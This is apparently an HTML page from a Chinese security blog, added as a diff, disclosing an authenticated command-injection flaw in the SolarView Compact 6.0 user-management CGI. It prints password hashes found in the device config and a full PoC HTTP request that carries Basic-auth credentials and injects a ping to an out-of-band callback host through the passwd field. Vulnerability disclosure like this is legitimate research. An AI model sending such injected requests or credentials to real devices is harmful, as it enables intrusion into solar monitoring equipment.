@@ -1,0 +1,224 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SolarView Compact 6.0 认证后RCE | CXAQHQ</title>
+<link rel="shortcut icon" href="https://blog.cxaqhq.cn/favicon.ico?v=1744037624894">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.cxaqhq.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SolarView Compact 6.0 认证后RCE | CXAQHQ - Atom Feed" href="https://blog.cxaqhq.cn/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+之前在 SolarView Compact 6.0 设备上挖了一些漏洞，不过都是PHP页面的，后来发现设备有一些Cgi文件，就看看也没有漏洞，结果真的发现一个，内容较为简单，此文仅作记录。
+漏洞点
+通过查System函数调用发现的。b..." />
+    <meta name="keywords" content="IoT漏洞挖掘" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.cxaqhq.cn">
+  <img class="avatar" src="https://blog.cxaqhq.cn/images/avatar.png?v=1744037624894" alt="">
+  </a>
+  <h1 class="site-title">
+    CXAQHQ
+  </h1>
+  <p class="site-description">
+    再努力一点！
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/badboycxcc" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/cxaqhq" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              SolarView Compact 6.0 认证后RCE
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-02-11
+              </span>
+              <span>
+                2 min read
+              </span>
+              
+                <a href="https://blog.cxaqhq.cn/tag/GjiehXXa3/" class="post-tag">
+                  # IoT漏洞挖掘
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="前言">前言</h2>
+<p>之前在 SolarView Compact 6.0 设备上挖了一些漏洞，不过都是PHP页面的，后来发现设备有一些Cgi文件，就看看也没有漏洞，结果真的发现一个，内容较为简单，此文仅作记录。</p>
+<h2 id="漏洞点">漏洞点</h2>
+<p>通过查System函数调用发现的。byte_148D0 值是由51行v2得到的，v2是由 off_12A68得到的。<br>
+<img src="https://blog.cxaqhq.cn/post-images/1676093648692.png" alt="" loading="lazy"><br>
+off_12A68 里面疑似记录是密码内容。<br>
+<img src="https://blog.cxaqhq.cn/post-images/1676094215273.png" alt="" loading="lazy"></p>
+<h2 id="漏洞验证">漏洞验证</h2>
+<p>直接访问设备Cgi文件提示401登录认证，根据之前的PHP漏洞获取设备权限，然后查看Web服务组件，发现设备是lighttpd ，根据进程找到lighttpd配置文件，发现记录密码位置。<br>
+<img src="https://blog.cxaqhq.cn/post-images/1676094509705.png" alt="" loading="lazy"><br>
+<img src="https://blog.cxaqhq.cn/post-images/1676094525114.png" alt="" loading="lazy"><br>
+内容如下，加密方式为 des(unix) 。</p>
+<pre><code>admin:OmAOSAs8DVjsc
+solar:RdE1VkNO5r4pY
+</code></pre>
+<p>根据cmd5查询得出密码并登录，疑似添加用户页面。<br>
+<img src="https://blog.cxaqhq.cn/post-images/1676094636556.png" alt="" loading="lazy"><br>
+使用Burp抓包，构造PoC进行验证<br>
+<img src="https://blog.cxaqhq.cn/post-images/1676094774818.png" alt="" loading="lazy"></p>
+<p>PoC 请求</p>
+<pre><code>POST /cgi-bin/p1_system_user.cgi HTTP/1.1
+Host: 110.*.*.*:2080
+Content-Length: 103
+Cache-Control: max-age=0
+Authorization: Basic YWRtaW46Y29udGVj
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://110.*.*.*:20802080/cgi-bin/p1_system_user.cgi
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+user=11&amp;passwd=11;ping%20-c%205%20cxaqhq.dizl2k6fs5a8lvmczhrl8bzw3n9dx2.oastify.com&amp;button=%C5%D0%CF%BF
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%82%B9">漏洞点</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81">漏洞验证</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://blog.cxaqhq.cn/post/OSCP Tools/">
+              <h3 class="post-title">
+                OSCP Tools
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Backdoor
+  <a class="rss" href="https://blog.cxaqhq.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
